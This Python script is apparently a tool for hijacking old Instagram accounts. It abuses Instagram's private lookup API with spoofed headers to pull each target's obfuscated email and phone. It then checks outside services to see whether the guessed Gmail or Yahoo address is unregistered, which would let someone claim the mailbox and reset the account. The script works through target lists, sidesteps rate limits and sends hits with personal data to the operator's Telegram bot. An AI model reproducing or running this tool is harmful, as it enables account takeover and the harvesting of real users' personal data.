import requests,os,random,time
import webbrowser
from time import sleep
user_agent = [
    "Instagram 99.4.0 S3od_al3nzi (Dmaral3noOoz)",'Instagram 155.0.0.37.107 Android (28/9; 320dpi; 720x1468; samsung; SM-A102U; a10e; exynos7885; en_US; 239490550)',
    'Instagram 64.0.0.12.96 (iPhone8,1; iOS 12_0_1; pt_BR; pt-BR; scale=2.00; gamut=normal; 750x1334; 124976489)',
    'Instagram 8.4.0 (iPhone7,2; iPhone OS 9_3_2; nb_NO; nb-NO; scale=2.00; 750x1334',
    'Instagram 93.1.0.19.102 Android (21/5.0.2; 240dpi; 540x960; samsung; SM-G530H; fortuna3g; qcom; ar_AE; 154400379)'
]
X=int(input("[?] With telegram ? \n[!] 0 = NO | 1 = YES\n+> "))
if X == 1 :
	try:
		tok=input("[?] TOKEN : ")
		ic=input("[?] ID : ")
		tel=requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ic}&text=HI\nIf you have a problem tell me\nINSTA : @DOOM.OLD| TELE : @ZXXXXZV")
	except:
		print("[!] Try with VPN ")
		input("")
		exit()
else:
	pass
os.system('cls' if os.name == 'nt' else 'clear')#DOOM
print("""\033[0;97mINSTA : DOOM.OLD – 968.OPS\n\033[1;34mIf you get a problem tell me in Instagram\nin » my instagram\nte » my telegram""")
def ops1(user):
	try:
		user=user.split("/")[3]
		user=user.split("?")[0] or user.split("/")[0]
	except:
		pass
	print('\n'+'\033[1;30m='*20+'\n')
	print(f"\033[1;30m[\033[0;37m?\033[1;30m] username: {user}\033[0;37m")
	url = "https://i.instagram.com:443/api/v1/users/lookup/"
	cookies = {"mid": "XOSINgABAAG1IDmaral3noOozrK0rrNSbPuSbzHq"}
	x=random.choice(user_agent)
	headers = {"Connection": "close", "X-IG-Connection-Type": "WIFI", "X-IG-Capabilities": "3R4=",
           "Accept-Language": "ar-AE",
           "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
           "User-Agent": x,
           "Accept-Encoding": "gzip, deflate"}
	data = {"signed_body": "35a2d547d3b6ff400f713948cdffe0b789a903f86117eb6e2f3e573079b2f038.{\"q\":\"%s\"}" % user }
	try:
		re = requests.post(url, headers=headers, cookies=cookies, data=data)
		if re.status_code == 200:
			pass
		elif "spam" in re.text:
			print("\033[1;30m[\033[1;31m!\033[1;30m] \033[1;31spam - try with VPN")
			input("")
			exit()
		elif "Please wait a few minutes before you try again." in re.text:
			print("\033[1;31m[!] wait 5m")
			print('\n'+'\033[1;30m='*20+'\n')
			sleep(60*5)
			ops1(user)
		elif '"message":"يرجى الانتظار لبضع دقائق قبل إعادة المحاولة.","status":"fail"' in re.text :
			print("\033[1;30m[\033[1;31m!\033[1;30m] \033[1;31wait 5m")
			print('\n'+'\033[1;30m='*20+'\n')
			sleep(60*5)
			ops1(user)
		elif '"message":"No users found","status":"fail"' in re.text :
			print("\033[1;30m[\033[1;31m!\033[1;30m] \033[1;31No usere found")
			print('\n'+'\033[1;30m='*20+'\n')
		elif '{"message":"لم يتم العثور على مستخدمين","status":"fail"}'in re.text:
			print("\033[1;30m[\033[1;31m!\033[1;30m] \033[1;31No usere found")
			print('\n'+'\033[1;30m='*20+'\n')
		else:
			print("\033[1;30m[\033[1;31m!\033[1;30m] \033[1;31error")
			print(re.text)
			print(re.status_code)
			exit()
		info = re.json()
	except:
		print("\033[1;30m[\033[1;31m!\033[1;30m] \033[1;31mthere is no Internet")
		exit()
	try:
		print("\033[1;30m[\033[0;37m$\033[1;30m] Email :\033[1;32m "+info['obfuscated_email'])
		m1=(user[0])
		m2=(user[-1])
		s=info["obfuscated_email"].split("@")[0]
		m3=(s[0])
		m4=(s[-1])
		if m1 == m3 and m2 == m4:
			v=0
			if '@yahoo.com' in info["obfuscated_email"]:
				req = requests.get("http://Xtools.PythonAnyWhere.Com/Yahoo/Ckeck?Email="+user+"@yahoo.com").text
				if '"status": "Available"}' in req:
					pass
				else:
					print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;31mNO")
					v=1
				rm=requests.get("https://jftv.pythonanywhere.com/IGMail/"+user+"@yahoo.com").text
				if "Linked Or Ban" in rm:
					print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;32mYES")
					print("\033[1;30m[\033[0;37m$\033[1;30m] Email Available :\033[1;32m "+user+"@yahoo.com")
					eml=user+"@yahoo.com"
				else:
					print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;31mNO")
					v=1
				
			elif '@gmail.com' in info["obfuscated_email"]:
				gmail = requests.get("https://soud.me/api/Gmail?email="+user+"@gmail.com").text
				if '{"info":{"Status":"Available"' in gmail:
					rm=requests.get("https://jftv.pythonanywhere.com/IGMail/"+user+"@gmail.com").text
					if "Linked Or Ban" in rm:
						print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;32mYES")
						print("\033[1;30m[\033[0;37m$\033[1;30m] Email Available :\033[1;32m "+user+"@gmail.com")
						eml=user+"@gmail.com"
					else:
						print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;31mNO")
						v=1
				else:
					print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;31mNO")
					v=1
			elif "@g*****.com" in info["obfuscated_email"]:
				p=requests.get("http://tweakpy-filza.ueuo.com/api.php?email="+user+"@googlemail.com").text
				if "False" in p:
					rm=requests.get("https://jftv.pythonanywhere.com/IGMail/"+user+"@googlemail.com").text
					if "Linked Or Ban" in rm:
						print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;32mYES")
						print("\033[1;30m[\033[0;37m$\033[1;30m] Email Available :\033[1;32m "+user+"@googlemail.com")
						eml=user+"@googlemail.com"
					else:
						print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;31mNO")
						v=1
				else:
					print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;31mNO")
					v=1
	except:
		print("\033[1;30m[\033[0;37m$\033[1;30m] Email :\033[1;31m False")
		v=1
	try:
		po=info['obfuscated_phone']
		print("\033[1;30m[\033[0;37m$\033[1;30m] Phone number :\033[1;32m "+ po)
	except:
		print("\033[1;30m[\033[0;37m$\033[1;30m] Phone number : \033[1;31mFalse")
		po="False"
	try:
		iid=info['user_id']
		print(f"\033[1;30m[\033[0;37m$\033[1;30m] user id :\033[1;32m {iid}")
	except:
		print("\033[1;30m[\033[0;37m$\033[1;30m] user id : \033[1;31mFalse")
	try:
		uid=info['user_id']
		x=requests.get(f"https://o7aa.pythonanywhere.com/?id={uid}").text
		x1=str(x).split('"data": ')[1]
		x2=str(x1).split(', "telegram":')[0]
		print("\033[1;30m[\033[0;37m$\033[1;30m] data :\033[1;32m "+x2)
	except:
		print("\033[1;30m[\033[0;37m$\033[1;30m] data : \033[1;31mFalse ")
	if X == 1:
		if v==1:
			pass
		else:
			tel=requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ic}&text=NEW OLD ACC\nUser : {user}\nEmail : {eml} Available or ban\nPhone : {po}\nData : {x2}\nINSTA : @DOOM.OLD | TELE : @ZXXXXZV")
	else:
		pass
	print('\n'+'\033[1;30m='*20+'\n')
def net():
	for accs in open('list.txt').read().splitlines():
		user=str(accs).split('\n')[0]
		ops1(user)
		time.sleep(3)
def ops ():
	print('\n'+'\033[1;30m='*20+'\n')
	user=input("\033[1;30m[\033[0;37m?\033[1;30m] username or url user : \033[0;37m")
	if user == "in":
		webbrowser.open("https://instagram.com/968.ops"),ops()
	elif user == "te":
		webbrowser.open("https://t.me/ZXXXXZV"),ops()
	else:
		pass
	try:
		user=user.split("/")[3]
		user=user.split("?")[0] or user.split("/")[0]
	except:
		pass
	url = "https://i.instagram.com:443/api/v1/users/lookup/"
	cookies = {"mid": "XOSINgABAAG1IDmaral3noOozrK0rrNSbPuSbzHq"}
	x=random.choice(user_agent)
	headers = {"Connection": "close", "X-IG-Connection-Type": "WIFI", "X-IG-Capabilities": "3R4=",
           "Accept-Language": "ar-AE",
           "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
           "User-Agent": x,
           "Accept-Encoding": "gzip, deflate"}
	data = {"signed_body": "35a2d547d3b6ff400f713948cdffe0b789a903f86117eb6e2f3e573079b2f038.{\"q\":\"%s\"}" % user }
	try:
		re = requests.post(url, headers=headers, cookies=cookies, data=data)
		if re.status_code == 200:
			pass
		elif "spam" in re.text:
			print("\033[1;30m[\033[1;31m!\033[1;30m] \033[1;31spam - try with VPN")
			ops()
		elif "Please wait a few minutes before you try again." in re.text:
			print("\033[1;31m[!] wait 5m")
			print('\n'+'\033[1;30m='*20+'\n')
			sleep(60*5)
		elif '"message":"يرجى الانتظار لبضع دقائق قبل إعادة المحاولة.","status":"fail"' in re.text :
			print("\033[1;30m[\033[1;31m!\033[1;30m] \033[1;31wait 5m")
			print('\n'+'\033[1;30m='*20+'\n')
			sleep(60*5)
			ops()
		elif '"message":"No users found","status":"fail"' in re.text :
			print("\033[1;30m[\033[1;31m!\033[1;30m] \033[1;31No usere found")
			print('\n'+'\033[1;30m='*20+'\n')
			ops()
		elif '{"message":"لم يتم العثور على مستخدمين","status":"fail"}'in re.text:
			print("\033[1;30m[\033[1;31m!\033[1;30m] \033[1;31No usere found")
			print('\n'+'\033[1;30m='*20+'\n')
			ops()
		else:
			print("\033[1;30m[\033[1;31m!\033[1;30m] \033[1;31error")
			print(re.text)
			print(re.status_code)
			ops()
		info = re.json()
	except:
		print("\033[1;30m[\033[1;31m!\033[1;30m] \033[1;31mthere is no Internet")
		ops()
	try:
		print("\033[1;30m[\033[0;37m$\033[1;30m] Email :\033[1;32m "+info['obfuscated_email'])
		m1=(user[0])
		m2=(user[-1])
		s=info["obfuscated_email"].split("@")[0]
		m3=(s[0])
		m4=(s[-1])
		if m1 == m3 and m2 == m4:
			v=0
			vx=0
			if '@yahoo.com' in info["obfuscated_email"]:
				req = requests.get("http://Xtools.PythonAnyWhere.Com/Yahoo/Ckeck?Email="+user+"@yahoo.com").text
				if '"status": "Available"}' in req:
					pass
				else:
					print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;31mNO"),ops()
				rm=requests.get("https://jftv.pythonanywhere.com/IGMail/"+user+"@yahoo.com").text
				if "Linked Or Ban" in rm:
					print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;32mYES")
					print("\033[1;30m[\033[0;37m$\033[1;30m] Email Available :\033[1;32m "+user+"@yahoo.com")
					eml=user+"@yahoo.com"
				else:
					print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;31mNO"),ops()
				
			elif '@gmail.com' in info["obfuscated_email"]:
				gmail = requests.get("https://soud.me/api/Gmail?email="+user+"@gmail.com").text
				if '{"info":{"Status":"Available"' in gmail:
					rm=requests.get("https://jftv.pythonanywhere.com/IGMail/"+user+"@gmail.com").text
					if "Linked Or Ban" in rm:
						print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;32mYES")
						print("\033[1;30m[\033[0;37m$\033[1;30m] Email Available :\033[1;32m "+user+"@gmail.com")
						eml=user+"@gmail.com"
					else:
						print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;31mNO"),ops()
				else:
					print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;31mNO"),ops()
			elif "@g*****.com" in info["obfuscated_email"]:
				p=requests.get("http://tweakpy-filza.ueuo.com/api.php?email="+user+"@googlemail.com").text
				if "False" in p:
					rm=requests.get("https://jftv.pythonanywhere.com/IGMail/"+user+"@googlemail.com").text
					if "Linked Or Ban" in rm:
						print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;32mYES")
						print("\033[1;30m[\033[0;37m$\033[1;30m] Email Available :\033[1;32m "+user+"@googlemail.com")
						eml=user+"@googlemail.com"
					else:
						print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;31mNO"),ops()
				else:
					print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;31mNO"),ops()
	except:
		print("\033[1;30m[\033[0;37m$\033[1;30m] Email :\033[1;31m False"),ops()
	try:
		po=info['obfuscated_phone']
		print("\033[1;30m[\033[0;37m$\033[1;30m] Phone number :\033[1;32m "+ po)
	except:
		print("\033[1;30m[\033[0;37m$\033[1;30m] Phone number : \033[1;31mFalse")
		po="False"
	try:
		iid=info['user_id']
		print(f"\033[1;30m[\033[0;37m$\033[1;30m] user id :\033[1;32m {iid}")
	except:
		print("\033[1;30m[\033[0;37m$\033[1;30m] user id : \033[1;31mFalse")
	try:
		uid=info['user_id']
		x=requests.get(f"https://o7aa.pythonanywhere.com/?id={uid}").text
		x1=str(x).split('"data": ')[1]
		x2=str(x1).split(', "telegram":')[0]
		print("\033[1;30m[\033[0;37m$\033[1;30m] data :\033[1;32m "+x2)
	except:
		print("\033[1;30m[\033[0;37m$\033[1;30m] data : \033[1;31mFalse ")
	if X == 1:
		tel=requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ic}&text=NEW OLD ACC\nUser : {user}\nEmail : {eml} Available or ban\nPhone : {po}\nData : {x2}\nINSTA : @DOOM.OLD | TELE : @ZXXXXZV")
	else:
		pass
	print('\n'+'\033[1;30m='*20+'\n')
	ops()
while True:
	print('\n'+'\033[1;30m='*20+'\n')
	try:
		vzbz=int(input("\033[1;30m[\033[0;37m?\033[1;30m] list.txt or not \n-> yes > 1 | no > 0 \n+> \033[0;37m"))
		if vzbz == 1:
			net()
		elif vzbz == 0:
			ops()
		else:
			print("[$] FUCK YOU")
	except:
		print("[$] FUCK YOU")
